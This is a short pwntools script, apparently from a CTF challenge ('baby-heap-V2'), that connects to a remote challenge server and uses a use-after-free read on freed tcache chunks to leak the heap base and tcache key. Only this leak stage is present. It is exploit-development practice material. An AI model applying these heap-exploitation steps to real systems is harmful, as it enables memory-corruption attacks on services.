import re
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST, PORT = "144.79.188.39", 40838
libc = ELF(r"D:\download\CTFTimeWriteup\PTITCTF2026\Pwn\baby-heap-V2\solve\libc\libc.so.6", checksec=False)

def enc(cur, ptr):
    return ptr ^ (cur >> 12)

def test_leak():
    io = remote(HOST, PORT, timeout=10)
    
    def menu(c): io.sendlineafter(b"> ", str(c).encode())
    def create(idx, size, data):
        menu(1)
        io.sendlineafter(b"Index: ", str(idx).encode())
        io.sendlineafter(b"Size: ", str(size).encode())
        io.sendafter(b"Data: ", data)
    def readn(idx):
        menu(2)
        io.sendlineafter(b"Index: ", str(idx).encode())
        io.recvuntil(b"Data: ")
        res = io.recvuntil(b"\n\n== babyheap-V2_patch ==")
        return res[:-len(b"\n\n== babyheap-V2_patch ==")]
    def delete(idx):
        menu(4)
        io.sendlineafter(b"Index: ", str(idx).encode())

    # Step 1: Leak heap
    create(0, 0x80, b"A" * 0x80)
    create(1, 0x80, b"B" * 0x80)
    delete(0)
    leak0 = readn(0)
    heap_base = u64(leak0[:8]) << 12
    log.success(f"Heap Base: {hex(heap_base)}")
    
    # Step 2: Delete 1
    delete(1)
    leak1 = readn(1)
    tcache_key = u64(leak1[8:16])
    log.info(f"Tcache Key: {hex(tcache_key)}")

    io.close()

if __name__ == "__main__":
    test_leak()
